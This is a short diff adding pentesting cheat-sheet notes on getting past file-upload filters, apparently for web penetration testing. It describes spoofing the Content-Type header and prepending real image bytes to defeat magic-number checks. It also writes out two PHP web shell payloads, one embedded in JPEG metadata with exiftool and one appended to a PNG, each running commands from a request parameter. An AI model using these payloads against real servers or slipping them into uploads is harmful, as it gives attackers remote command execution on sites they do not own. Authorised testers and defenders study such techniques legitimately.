@@ -1,1 +1,13 @@
+Bypass Content-Type, Magic Number, Compression & Resizing
+Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream
 
+Content-Type Wordlists 
+https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt 
+
+Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). 
+
+Introduce the shell inside the metadata
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg\ 
+
+Introduce the payload directly in an image:
+echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
